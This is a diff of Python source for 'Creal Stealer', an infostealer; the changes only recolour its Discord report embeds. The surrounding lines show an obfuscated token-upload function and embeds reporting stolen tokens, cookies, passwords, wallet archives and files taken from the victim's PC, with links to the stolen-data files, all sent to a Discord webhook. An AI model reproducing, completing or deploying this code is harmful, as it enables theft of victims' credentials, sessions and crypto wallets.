@@ -286,7 +286,7 @@ def upl05dT4k31(t0k3n, path):
         "content": f'{globalInfo()} | `{path}`',
         "embeds": [
             {
-            "color": 0000000,
+            "color": 2895667,
             "fields": [
                 {
                     "name": "<a:hyperNOPPERS:828369518199308388> Token:",
@@ -368,7 +368,7 @@ def upload(name, link):
                 {
                     "title": "Creal | Cookies Stealer",
                     "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
-                    "color": 000000,
+                    "color": 2895667,
                     "footer": {
                         "text": "Creal Stealer",
                         "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
@@ -394,7 +394,7 @@ def upload(name, link):
                 {
                     "title": "Creal | Password Stealer",
                     "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
-                    "color": 000000,
+                    "color": 2895667,
                     "footer": {
                         "text": "Creal Stealer",
                         "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
@@ -413,7 +413,7 @@ def upload(name, link):
             "content": f"{globalInfo()}",
             "embeds": [
                 {
-                "color": 000000,
+                "color": 2895667,
                 "fields": [
                     {
                     "name": "Interesting files found on user PC:",
@@ -622,7 +622,7 @@ def GatherZips(paths1, paths2, paths3):
             {
             "title": "Creal Zips",
             "description": f"{wal}\n{ga}\n{ot}",
-            "color": 000000,
+            "color": 2895667,
             "footer": {
                 "text": "Creal Stealer",
                 "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
